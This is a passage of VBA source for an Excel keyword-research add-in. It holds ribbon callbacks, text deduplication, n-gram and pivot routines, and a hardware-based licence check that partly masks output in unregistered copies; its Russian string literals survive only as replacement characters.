Dim n As Long
    n = Selection.Columns.Count - 1
createNgramPivotSumDictFromNColumns 1, 1, 5, n
End Sub
Sub SEM_freqdictNgrams(control As IRibbonControl)
Dim x As Long, n As Long
n = Application.InputBox("N=?", "", Type:=1)
    x = Selection.Columns.Count - 1
createNgramPivotSumDictFromNColumns 1, 1, n, x
End Sub
Sub SEM_freqDict2Grams2ColumnsBypassStopWords(control As IRibbonControl)
freqDict2GramsWithStopWords (2)
End Sub
Sub SEM_freqDict2Grams1ColumnBypassStopWords(control As IRibbonControl)
freqDict2GramsWithStopWords (1)
End Sub

Sub SEM_GoogleSug(control As IRibbonControl)
GoogleSuggest
End Sub
Sub SEM_GoogleSugDEEP(control As IRibbonControl)
GoogleSuggestDeep
End Sub
Sub SEM_GoogleSugEn(control As IRibbonControl)
GoogleSuggestEn
End Sub
Sub SEM_GoogleSugDeepEn(control As IRibbonControl)
GoogleSuggestDeepEn
End Sub
Sub SEM_getSugYTToDict(control As IRibbonControl)
getSugYTToDict
End Sub
Sub SEM_getSugBingToDict(control As IRibbonControl)
getSugYTToDict
End Sub
Sub SEM_getSugAmazonToDict(control As IRibbonControl)
getSugYTToDict
End Sub
Sub SEM_Yandex_SQ_Analysis(control As IRibbonControl)
SearchQueriesAnalysis True
End Sub
Sub SEM_Google_SQ_Analysis(control As IRibbonControl)
SearchQueriesAnalysis False
End Sub
Sub SEM_koordinatyyandyekskart(control As IRibbonControl)
UDFArr "koordinatyyandyekskart"
End Sub
'F E E D B A C K
Sub SEM_SiteRu(control As IRibbonControl)
callWebPage ("https://semtools.guru/ru/")
End Sub
Sub SEM_SiteEn(control As IRibbonControl)
callWebPage ("https://semtools.guru/")
End Sub
Sub SEM_AuthorEn(control As IRibbonControl)
callWebPage ("https://semtools.guru/author/")
End Sub
Sub SEM_AuthorRu(control As IRibbonControl)
callWebPage ("https://semtools.guru/ru/author/")
End Sub
Sub SEM_Author_YT(control As IRibbonControl)
callWebPage ("https://www.youtube.com/c/DmitryTumaykin")
End Sub
Sub SEM_aboutAddinEn(control As IRibbonControl)
callWebPage ("https://semtools.guru/")
End Sub
Sub SEM_VersionCheckRu(control As IRibbonControl)
VersionCheck False
End Sub
Sub SEM_VersionCheckEn(control As IRibbonControl)
VersionCheck True
End Sub
Sub SEM_dlAddinRu(control As IRibbonControl)
callWebPage ("https://semtools.guru/ru/download/")
End Sub
Sub SEM_dlAddinEn(control As IRibbonControl)
callWebPage ("https://semtools.guru/download/")
End Sub
'''''''''''''''''

'S U B S

'''''''''''''''''
Sub OptimizeON()
    Application.ScreenUpdating = False
    Application.Calculation = xlCalculationManual
    ActiveSheet.DisplayPageBreaks = False
    Application.DisplayStatusBar = False
    Application.DisplayAlerts = False
End Sub
Sub OptimizeOFF()
    Application.ScreenUpdating = True
    Application.Calculation = xlCalculationAutomatic
    Application.EnableEvents = True
    ActiveSheet.DisplayPageBreaks = True
    Application.DisplayStatusBar = True
    Application.DisplayAlerts = True
End Sub
'<><><><><><><><
Sub CellsByRep(unique As Boolean, method As String, Optional replPat As String)
Dim dict As Object, a(), i As Long
Set dict = CreateObject("Scripting.Dictionary")
selector
a = Selection.Value2
For i = LBound(a) To UBound(a)
    If dict.exists(UCase$(a(i, 1))) Then
    dict.item(UCase$(a(i, 1))) = False
    Else
    dict.Add UCase$(a(i, 1)), True
    End If
Next i
If unique = True Then
    If method = "find" Then
        For i = LBound(a) To UBound(a)
            a(i, 1) = dict.item(UCase$(a(i, 1)))
        Next i
    ElseIf method = "extr" Then
        For i = LBound(a) To UBound(a)
            If dict.item(UCase$(a(i, 1))) = True Then Else a(i, 1) = ""
        Next i
    ElseIf method = "del" Then
        For i = LBound(a) To UBound(a)
            If dict.item(UCase$(a(i, 1))) = False Then Else a(i, 1) = ""
        Next i
    ElseIf method = "repl" Then
        replPat = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?", title:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Type:=2)
        For i = LBound(a) To UBound(a)
            If dict.item(UCase$(a(i, 1))) = False Then Else a(i, 1) = replPat
        Next i
    Else:
    End If
Else
    If method = "find" Then
        For i = LBound(a) To UBound(a)
            a(i, 1) = Not dict.item(UCase$(a(i, 1)))
        Next i
    ElseIf method = "extr" Then
        For i = LBound(a) To UBound(a)
            If dict.item(UCase$(a(i, 1))) = False Then Else a(i, 1) = ""
        Next i
    ElseIf method = "del" Then
        For i = LBound(a) To UBound(a)
            If dict.item(UCase$(a(i, 1))) = True Then Else a(i, 1) = ""
        Next i
    ElseIf method = "repl" Then
        replPat = Application.InputBox(Prompt:="|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?", title:="|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Type:=2)
        For i = LBound(a) To UBound(a)
            If dict.item(UCase$(a(i, 1))) = True Then Else a(i, 1) = replPat
        Next i
    Else:
    End If
End If
Selection.Value2 = a
End Sub
Sub cellIs(order As String)
Dim dict As Object, a(), i As Long
Set dict = CreateObject("Scripting.Dictionary")
selector
a = Selection.Value2
If order = "first" Then
For i = LBound(a) To UBound(a)
    If dict.exists(UCase$(a(i, 1))) Then
    a(i, 1) = False
    Else
    dict.Add UCase$(a(i, 1)), True
    a(i, 1) = True
    End If
Next i
ElseIf order = "last" Then
For i = UBound(a) To LBound(a) Step -1
    If dict.exists(UCase$(a(i, 1))) Then
    a(i, 1) = False
    Else
    dict.Add UCase$(a(i, 1)), True
    a(i, 1) = True
    End If
Next i
Else:
End If
Selection.Value = a
End Sub
Sub cellCount()
Dim dict As Object, a(), i As Long
Set dict = CreateObject("Scripting.Dictionary")
selector
a = Selection.Value2
For i = LBound(a) To UBound(a)
    If dict.exists(UCase$(a(i, 1))) Then
    dict.item(UCase$(a(i, 1))) = dict.item(UCase$(a(i, 1))) + 1
    Else
    dict.Add UCase$(a(i, 1)), 1
    End If
Next i
For i = LBound(a) To UBound(a)
    a(i, 1) = dict.item(UCase$(a(i, 1)))
Next i
Selection.Value2 = a
End Sub
Sub crBSR(rng As Range) 'cr binS rng
Dim arr(), i As Long
arr = rng.Columns(1).Value2
For i = LBound(arr) To UBound(arr)
    arr(i, 1) = CStr(arr(i, 1))
Next
abc.Range("K1").Resize(UBound(arr), 1).NumberFormat = "@"
abc.Range("K1").Resize(UBound(arr), 1) = arr
abc.Range("K:K").Sort Key1:=abc.Range("K1"), Order1:=xlAscending, Header:=xlNo
abc.Range("K1", abc.Range("K1").End(xlDown)).name = "BSR"
End Sub
Sub crBSRUC(rng As Range) 'cr binS rng
Dim arr(), i As Long
arr = rng.Columns(1).Value2
For i = LBound(arr) To UBound(arr)
    arr(i, 1) = UCase$(CStr(arr(i, 1)))
Next
abc.Range("K1").Resize(UBound(arr), 1).NumberFormat = "@"
abc.Range("K1").Resize(UBound(arr), 1) = arr
abc.Range("K:K").Sort Key1:=abc.Range("K1"), Order1:=xlAscending, Header:=xlNo
abc.Range("K1", abc.Range("K1").End(xlDown)).name = "BSR"
End Sub
Sub remBSR()
abc.Range("K:K").Clear
End Sub
Sub remRowsIfCellTrue(ftn As String)
Dim i As Long, x As Long, y As Long, z As Long
If Selection.Rows.Count = 1 Or Selection.Columns.Count <> 1 Then
    MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 1 |fffd||fffd||fffd||fffd||fffd||fffd| 1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    Exit Sub
Else
End If
OptimizeON
selector
x = Selection.Rows(1).Row
y = Selection.Rows.Count + x - 1
z = Selection.Columns(1).Column
    For i = y To x Step -1
        If Application.Run(ftn, Cells(i, z).Value2) = True Then
            Rows(i).Delete
        End If
    Next i
OptimizeOFF
End Sub
Sub remRowsIfCellTrue2PL(ftn As String, l As Long)
Dim i As Long, x As Long, y As Long, z As Long
If Selection.Rows.Count = 1 Or Selection.Columns.Count <> 1 Then
    MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 1 |fffd||fffd||fffd||fffd||fffd||fffd| 1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    Exit Sub
Else
End If
OptimizeON
selector
x = Selection.Rows(1).Row
y = Selection.Rows.Count + x - 1
z = Selection.Columns(1).Column
    For i = y To x Step -1
        If Application.Run(ftn, Cells(i, z).Value2, l) = True Then
            Rows(i).Delete
        End If
    Next i
OptimizeOFF
End Sub
Sub remRowsIfCellTrue2PS(ftn As String, s As String)
Dim i As Long, x As Long, y As Long, z As Long
If Selection.Rows.Count = 1 Or Selection.Columns.Count <> 1 Then
    MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 1 |fffd||fffd||fffd||fffd||fffd||fffd| 1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    Exit Sub
Else
End If
OptimizeON
selector
x = Selection.Rows(1).Row
y = Selection.Rows.Count + x - 1
z = Selection.Columns(1).Column
    For i = y To x Step -1
        If Application.Run(ftn, Cells(i, z).Value2, s) = True Then
            Rows(i).Delete
        End If
    Next i
OptimizeOFF
End Sub
Sub remRowsIfCellTrue2PRng(ftn As String, rng As Range)
Dim i As Long, x As Long, y As Long, z As Long
If Selection.Rows.Count = 1 Or Selection.Columns.Count <> 1 Then
    MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 1 |fffd||fffd||fffd||fffd||fffd||fffd| 1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    Exit Sub
Else
End If
OptimizeON
selector
x = Selection.Rows(1).Row
y = Selection.Rows.Count + x - 1
z = Selection.Columns(1).Column
    For i = y To x Step -1
        If Application.Run(ftn, Cells(i, z).Value2, rng) = True Then
            Rows(i).Delete
        End If
    Next i
OptimizeOFF
End Sub
Sub UDFArr(ftn As String)
OptimizeON
selector
Dim a(), i As Long
If Selection.Count > 1 Then a = Selection.Value2 Else a = Range(Selection, Selection.Offset(0, 1)).Value2
If binSearchB(getHardware(), abc.Range("O1", abc.Range("O1").End(xlDown))) Then
    For i = LBound(a) To UBound(a):
        a(i, 1) = Application.Run(ftn, CStr(a(i, 1)))
        Next
Else:
    For i = LBound(a) To UBound(a):
        If WorksheetFunction.RandBetween(0, 2) + i <> i Then a(i, 1) = Application.Run(ftn, CStr(a(i, 1))) Else a(i, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        Next
End If
Selection.Value2 = a
OptimizeOFF
End Sub
Sub UDFArr2PB(ftn As String, param2 As Boolean)
OptimizeON
selector
Dim a(), i As Long
If Selection.Count > 1 Then a = Selection.Value2 Else a = Range(Selection, Selection.Offset(0, 1)).Value2
If binSearchB(getHardware(), abc.Range("O1", abc.Range("O1").End(xlDown))) Then
    For i = LBound(a) To UBound(a):
    a(i, 1) = Application.Run(ftn, CStr(a(i, 1)), param2)
    Next
Else:
    For i = LBound(a) To UBound(a):
    If WorksheetFunction.RandBetween(0, 2) + i <> i Then a(i, 1) = Application.Run(ftn, CStr(a(i, 1)), param2) Else a(i, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    Next
End If
Selection.Value2 = a
OptimizeOFF
End Sub
Sub UDFArr3PS(ftn As String, param2 As String, param3 As String)
OptimizeON
selector
Dim a(), i As Long
If Selection.Count > 1 Then a = Selection.Value2 Else a = Range(Selection, Selection.Offset(0, 1)).Value2
If binSearchB(getHardware(), abc.Range("O1", abc.Range("O1").End(xlDown))) Then
    For i = LBound(a) To UBound(a):
    a(i, 1) = Application.Run(ftn, CStr(a(i, 1)), param2, param3)
    Next
Else:
    For i = LBound(a) To UBound(a):
    If WorksheetFunction.RandBetween(0, 2) + i <> i Then a(i, 1) = Application.Run(ftn, CStr(a(i, 1)), param2) Else a(i, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    Next
End If
Selection.Value2 = a
OptimizeOFF
End Sub
Sub UDFArr2PL(ftn As String, param2 As Long)
OptimizeON
selector
Dim a(), i As Long
If Selection.Count > 1 Then a = Selection.Value2 Else a = Range(Selection, Selection.Offset(0, 1)).Value2
If binSearchB(getHardware(), abc.Range("O1", abc.Range("O1").End(xlDown))) Then
    For i = LBound(a) To UBound(a):
    a(i, 1) = Application.Run(ftn, CStr(a(i, 1)), param2)
    Next
Else:
    For i = LBound(a) To UBound(a):
    If WorksheetFunction.RandBetween(0, 2) + i <> i Then a(i, 1) = Application.Run(ftn, CStr(a(i, 1)), param2) Else a(i, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    Next
End If
Selection.Value2 = a
OptimizeOFF
End Sub
Sub UDFArr2PS(ftn As String, param2 As String)
OptimizeON
selector
Dim a(), i As Long
If Selection.Count > 1 Then a = Selection.Value2 Else a = Range(Selection, Selection.Offset(0, 1)).Value2
If binSearchB(getHardware(), abc.Range("O1", abc.Range("O1").End(xlDown))) Then
    For i = LBound(a) To UBound(a):
    a(i, 1) = Application.Run(ftn, CStr(a(i, 1)), param2)
    Next
Else:
    For i = LBound(a) To UBound(a):
    If WorksheetFunction.RandBetween(0, 2) + i <> i Then a(i, 1) = Application.Run(ftn, CStr(a(i, 1)), param2) Else a(i, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    Next
End If
Selection.Value2 = a
OptimizeOFF
End Sub
Sub UDFArr2PRng(ftn As String, param2 As Range)
OptimizeON
selector
Dim a(), i As Long
If Selection.Count > 1 Then a = Selection.Value2 Else a = Range(Selection, Selection.Offset(0, 1)).Value2
If binSearchB(getHardware(), abc.Range("O1", abc.Range("O1").End(xlDown))) Then
    For i = LBound(a) To UBound(a):
    a(i, 1) = Application.Run(ftn, CStr(a(i, 1)), param2)
    Next
Else:
    For i = LBound(a) To UBound(a):
    If WorksheetFunction.RandBetween(0, 2) + i <> i Then a(i, 1) = Application.Run(ftn, CStr(a(i, 1)), param2) Else a(i, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    Next
End If
Selection.Value2 = a
OptimizeOFF
End Sub

Sub UDFrng(ftn As String)
Dim cel As Range
OptimizeON
selector
If binSearchB(getHardware(), abc.Range("O1", abc.Range("O1").End(xlDown))) Then
    For Each cel In Selection
    cel.Value2 = Application.Run(ftn, cel)
    Next cel
Else:
MsgBox "Available in registered version"
End If
OptimizeOFF
End Sub
Sub UDFrngLive(ftn As String, t As Long)
Dim cel As Range
On Error GoTo handleCancel
Application.EnableCancelKey = xlErrorHandler
MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| ESC"
    For Each cel In Selection
    cel.Value2 = Application.Run(ftn, cel)
    Application.Wait (Now + TimeValue("00:00:0" & CStr(t)))
    Next cel
If Cancel Then Exit Sub
handleCancel:
If Err = 18 Then
    MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
End If
End Sub
Sub dictToWS(dict As Object, r As Long, c As Long, itemElementsCount As Long)
Dim Key As Variant, i As Long, j As Long, arr() As Variant
ReDim arr(dict.Count, itemElementsCount + 1)
i = 1
If itemElementsCount = 0 Then
    If binSearchB(getHardware(), abc.Range("O1", abc.Range("O1").End(xlDown))) Then
        For Each Key In dict.Keys
            arr(i, 1) = Key
            i = i + 1
        Next
    Else:
        For Each Key In dict.Keys
            If WorksheetFunction.RandBetween(0, 2) + i <> i Then arr(i, 1) = Key Else arr(i, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
            i = i + 1
        Next
    End If
ElseIf itemElementsCount = 1 Then
    If binSearchB(getHardware(), abc.Range("O1", abc.Range("O1").End(xlDown))) Then
        For Each Key In dict.Keys
            arr(i, 1) = Key
            arr(i, 2) = dict.item(Key)
            i = i + 1
        Next
    Else:
        For Each Key In dict.Keys
            arr(i, 1) = Key
            If WorksheetFunction.RandBetween(0, 2) + i <> i Then arr(i, 2) = dict.item(Key) Else arr(i, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
            i = i + 1
        Next
    End If
Else
    If binSearchB(getHardware(), abc.Range("O1", abc.Range("O1").End(xlDown))) Then
        For Each Key In dict.Keys
            arr(i, 1) = Key
            For j = 1 To itemElementsCount
                arr(i, j + 1) = dict.item(Key)(j - 1) 'arr(i, j+1)
            Next j
        i = i + 1
        Next
    Else:
        For Each Key In dict.Keys
            If WorksheetFunction.RandBetween(0, 2) + i <> i Then arr(i, 1) = Key Else arr(i, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
            For j = 1 To itemElementsCount
                arr(i, j + 1) = dict.item(Key)(j - 1) 'arr(i, j+1)
            Next j
        i = i + 1
        Next
    End If
End If
    With Worksheets.Add
        .Cells(r, c).Resize(dict.Count, itemElementsCount + 1) = arr
    End With
End Sub
Sub findSelectFirst(s As String)
Cells.find(What:=s, After:=Cells(1, 1), LookIn:=xlFormulas, LookAt:=xlWhole, SearchOrder:=xlByRows, SearchDirection:= _
    xlNext, MatchCase:=False).Offset(1, 0).Select
End Sub
Sub selectAllUnder(s As String)
Cells.find(What:=s, After:=Cells(1, 1), LookIn:=xlFormulas, LookAt:=xlWhole, SearchOrder:=xlByRows, SearchDirection:= _
    xlNext, MatchCase:=False).Offset(1, 0).Select
Range(Selection, Cells(Rows.Count, Selection.Column).End(xlUp)).Select
End Sub
Sub selfCombineSelection()
Dim arr(), columnCount As Long, i As Long, j As Long, dict As Object
Set dict = CreateObject("Scripting.Dictionary")
    arr = Selection.Value2
    For i = LBound(arr) To UBound(arr)
        For j = LBound(arr) To UBound(arr)
            If j = i Or dict.exists(arr(i, 1) & "\" & arr(j, 1)) Then Else dict.Add arr(i, 1) & "\" & arr(j, 1), False
        Next j
    Next i
    Erase arr
dictToWS dict, 1, 1, 1
End Sub
Private Sub mergeRngHor(delim As String)
Dim arr(), arr2(), i As Long, x As Long
If Selection.Count = 1 Then
MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| 1 |fffd||fffd||fffd||fffd||fffd||fffd|"
Exit Sub
End If
arr = Selection.Value2
x = Selection.Columns.Count
i = UBound(arr)
ReDim arr2(i, 1)
For i = LBound(arr) To UBound(arr)
    arr2(i, 1) = arr(i, 1)
    For j = 2 To x
        arr2(i, 1) = arr2(i, 1) & delim & arr(i, j)
    Next j
Next i
With Worksheets.Add
        .name = "output"
        .[a1].Resize(UBound(arr2), 1) = arr2
End With
End Sub
Sub pivotConcat()
Dim arr(), i As Long, dict As Object, delim As String
delim = Application.InputBox("Input delimeter", "Delimeter", Type:=2)
Set dict = CreateObject("Scripting.Dictionary")
    arr = Selection.Value2
    For i = LBound(arr) To UBound(arr)
        If dict.exists(arr(i, 1)) Then dict.item(arr(i, 1)) = dict.item(arr(i, 1)) & delim & arr(i, 2) Else dict.Add arr(i, 1), arr(i, 2)
    Next i
dictToWS dict, 1, 1, 1
End Sub
Sub pivotMorphDict()
Dim arr(), i As Long, dict As Object
Get_lemmDict
Set dict = CreateObject("Scripting.Dictionary")
    arr = Range("[lemms.xlsb]lemmdict!slovarlyemm").Value2
    For i = LBound(arr) To UBound(arr)
        If arr(i, 3) = "v" Then
        Else:
        If dict.exists(arr(i, 2)) Then dict.item(arr(i, 2)) = dict.item(arr(i, 2)) & ", " & arr(i, 1) Else dict.Add arr(i, 2), arr(i, 1)
        End If
    Next i
dictToWS dict, 1, 1, 1
End Sub
Sub all2ItemCombinationsInRows()
Dim arr(), columnCount As Long, i As Long, j As Long, dict As Object
Set dict = CreateObject("Scripting.Dictionary")
For columnCount = 1 To Selection.Columns.Count
    Range(Cells(1, columnCount), Cells(1, columnCount).End(xlDown)).Select
    arr = Selection.Value2
    For i = LBound(arr) To UBound(arr)
        For j = LBound(arr) To UBound(arr)
            If j = i Or dict.exists(arr(i, 1) & "\" & arr(j, 1)) Then Else dict.Add arr(i, 1) & "\" & arr(j, 1), False
        Next j
    Next i
    Erase arr
Next columnCount
dictToWS dict, 1, 1, 1
End Sub
Sub createPivotDictFromNColumns(R1 As Long, C1 As Long, n As Long, op As String)
Dim delim As String, i As Long, r As Long, dict As Object, temparr() As Variant, tmpstr As String
OptimizeON
    Selection.Replace What:="-", Replacement:="0", LookAt:=xlWhole
    Selection.Replace What:="", Replacement:="0", LookAt:=xlWhole
If MsgBox("Does data contain headers?", vbQuestion + vbYesNo) = vbYes Then
    a = Selection.Offset(1, 0).Resize(Selection.Rows.Count - 1).Value2
Else:
    a = Selection.Value2
End If
    delim = vbTab
    Set dict = CreateObject("Scripting.Dictionary")
If n = 0 Then
    'statement
        For r = LBound(a) To UBound(a):
            If dict.exists(a(r, 1)) Then
                dict.item(a(r, 1)) = dict.item(a(r, 1)) + 1
            Else
                dict.Add a(r, 1), 1
            End If
    Next r
dictToWS dict, R1, C1, 1
OptimizeOFF
Exit Sub
ElseIf n = 1 Then
    'statement
    If op = "sum" Then
        For r = LBound(a) To UBound(a):
            If dict.exists(a(r, 1)) Then
                dict.item(a(r, 1)) = dict.item(a(r, 1)) + a(r, 2)
            Else
                dict.Add a(r, 1), a(r, 2)
            End If
        Next r
    ElseIf op = "min" Then
        For r = LBound(a) To UBound(a):
            If dict.exists(a(r, 1)) Then
                dict.item(a(r, 1)) = WorksheetFunction.Min(dict.item(a(r, 1)), a(r, 2))
            Else
                dict.Add a(r, 1), a(r, 2)
            End If
        Next r
    ElseIf op = "max" Then
        For r = LBound(a) To UBound(a):
            If dict.exists(a(r, 1)) Then
                dict.item(a(r, 1)) = WorksheetFunction.Max(dict.item(a(r, 1)), a(r, 2))
            Else
                dict.Add a(r, 1), a(r, 2)
            End If
        Next r
    Else:
    End If
Else:
'n>1
    For r = LBound(a) To UBound(a):
                If dict.exists(a(r, 1)) Then
                    ReDim temparr(n)
                    For i = LBound(temparr) To UBound(temparr)
                        temparr(i) = dict.item(a(r, 1))(i - 1) + a(r, i + 1)
                    Next i
                    dict.item(a(r, 1)) = Split(Join(temparr, delim), delim)
                    Erase temparr
                Else
                    ReDim temparr(n)
                    For i = LBound(temparr) To UBound(temparr)
                        temparr(i) = a(r, i + 1)
                    Next i
                    dict.Add (a(r, 1)), Split(Join(temparr, delim), delim)
                    Erase temparr
                End If
    Next r
End If
dictToWS dict, R1, C1, n
OptimizeOFF
End Sub

Sub createNgramPivotSumDictFromNColumns(R1 As Long, C1 As Long, n As Long, columnCount As Long)
Dim delim As String, i As Long, j As Long, r As Long, dict As Object, temparr() As Variant, temparr2() As Variant, tmpstr As String
Dim arrWord() As String, x As Long, headers As Range
OptimizeON
    Selection.Replace What:="-", Replacement:="0", LookAt:=xlWhole
    Selection.Replace What:="", Replacement:="0", LookAt:=xlWhole
    a = Selection.Value2
    delim = vbTab
    Set dict = CreateObject("Scripting.Dictionary")
If columnCount = 0 Then
'|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| n-gram
    For r = LBound(a) To UBound(a)
    arrWord = Split(WStrim(a(r, 1)) & " ")
        For i = LBound(arrWord) To UBound(arrWord) - 1
                tmpstr = substring(CStr(a(r, 1)), i, n)
                If tmpstr = "" Then
                ElseIf dict.exists(tmpstr) Then
                    dict.item(tmpstr) = dict.item(tmpstr) + 1
                Else:
                    dict.Add tmpstr, 1
                End If
        Next i
    Next r
dictToWS dict, R1, C1, 1
OptimizeOFF
Exit Sub
ElseIf columnCount = 1 Then '|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    For r = LBound(a) To UBound(a)
    arrWord = Split(WStrim(a(r, 1)) & " ")
        For i = LBound(arrWord) To UBound(arrWord) - 1
                tmpstr = substring(CStr(a(r, 1)), i, n)
                If tmpstr = "" Then
                ElseIf dict.exists(tmpstr) Then
                    dict.item(tmpstr) = dict.item(tmpstr) + a(r, 2)
                Else:
                    dict.Add tmpstr, a(r, 2)
                End If
        Next i
    Next r
'|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Else:
ReDim temparr(columnCount)
    For r = LBound(a) To UBound(a)
    arrWord = Split(WStrim(a(r, 1)) & " ")
        For j = LBound(temparr) To UBound(temparr)
            temparr(j) = a(r, j + 1)
        Next j
        For i = LBound(arrWord) To UBound(arrWord) - 1
                tmpstr = substring(CStr(a(r, 1)), i, n)
                If tmpstr = "" Then
                ElseIf dict.exists(tmpstr) Then
                    ReDim temparr2(columnCount)
                    For j = LBound(temparr) To UBound(temparr)
                        temparr2(j) = dict.item(tmpstr)(j - 1) + temparr(j)
                    Next j
                    dict.item(tmpstr) = Split(Join(temparr2, delim), delim)
                    Erase temparr2
                Else:
                    dict.Add tmpstr, Split(Join(temparr, delim), delim)
                End If
        Next i
    Next r
End If
dictToWS dict, R1, C1, columnCount
OptimizeOFF
End Sub
Sub findPhrases(rng As Range)
Dim delim As String, r As Long, i As Long, j As Long, k As Long, dict As Object, tmpstr As String, wrdarr() As String
Dim phr(), arr(), x As Long, wrd As String, phrEnds() As String, foundPhr As Boolean
OptimizeON
selector
If Selection.Count = 1 Then Exit Sub Else arr() = Selection.Value2
    phr = rng.Value2
    delim = vbTab
    Set dict = CreateObject("Scripting.Dictionary")

    For r = LBound(phr) To UBound(phr)
        tmpstr = extrFirstWord(CStr(phr(r, 1)))
            
            If dict.exists(UCase(tmpstr)) Then
                   dict.item(UCase(tmpstr)) = dict.item(UCase(tmpstr)) & delim & phr(r, 1)
            Else:
                   dict.Add UCase(tmpstr), phr(r, 1)
            End If
    Next r

For i = LBound(arr) To UBound(arr)
    wrdarr = Split(arr(i, 1) & " ", " ")
    wrd = arr(i, 1)
    tmpstr = ""
    arr(i, 1) = False
    For j = LBound(wrdarr) To UBound(wrdarr) - 1
        If dict.exists(UCase(wrdarr(j))) Then
            If UCase(dict.item(UCase(wrdarr(j)))) = UCase(wrdarr(j)) Then
                arr(i, 1) = True
                Exit For
            Else
                phrEnds = Split(dict.item(UCase(wrdarr(j))), delim)
                For k = LBound(phrEnds) To UBound(phrEnds)
                    If InStr(1, " " & wrd & " ", " " & phrEnds(k) & " ", vbTextCompare) > 0 Then
                    arr(i, 1) = True
                    Exit For
                    Else
                    End If
                Next k
            End If
        Else
        End If
    Next j
Next i
Selection.Value2 = arr
OptimizeOFF
End Sub
Sub extrPhrases(rng As Range)
Dim delim As String, r As Long, i As Long, j As Long, k As Long, dict As Object, tmpstr As String, wrdarr() As String
Dim phr(), arr(), x As Long, wrd As String, phrEnds() As String, foundPhr As Boolean
OptimizeON
selector
If Selection.Count = 1 Then Exit Sub Else arr() = Selection.Value2
    phr = rng.Value2
    delim = vbTab
    Set dict = CreateObject("Scripting.Dictionary")

    For r = LBound(phr) To UBound(phr)
        tmpstr = extrFirstWord(CStr(phr(r, 1)))
            
            If dict.exists(UCase(tmpstr)) Then
                   dict.item(UCase(tmpstr)) = dict.item(UCase(tmpstr)) & delim & phr(r, 1)
            Else:
                   dict.Add UCase(tmpstr), phr(r, 1)
            End If
    Next r

For i = LBound(arr) To UBound(arr)
    wrdarr = Split(arr(i, 1) & " ", " ")
